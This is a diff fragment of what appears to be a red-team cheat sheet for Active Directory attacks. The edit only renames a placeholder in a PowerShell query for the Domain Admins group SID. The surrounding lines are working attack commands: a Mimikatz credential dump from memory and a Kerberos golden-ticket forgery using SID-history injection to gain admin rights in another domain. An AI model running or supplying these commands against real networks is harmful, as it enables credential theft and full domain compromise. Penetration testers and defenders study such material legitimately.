@@ -22,7 +22,7 @@ mimi> sekurlsa::logonPasswords full
 whoami /user
 
 # get sid of target Domain Admins group
-PS> ([adsisearcher]"(&(objectClass=group)(samaccountname=<>))").FindAll().Properties
+PS> ([adsisearcher]"(&(objectClass=group)(samaccountname=<name>))").FindAll().Properties
 
 # create kerberos ticket
 kerberos::golden /user:<attackerUser> /domain:<attackerDomain> /sid:<attackerSid> /sids:<targetDomainAdminGroupSid> /ticket:"<pathToKerberosTicket>.kirbi"
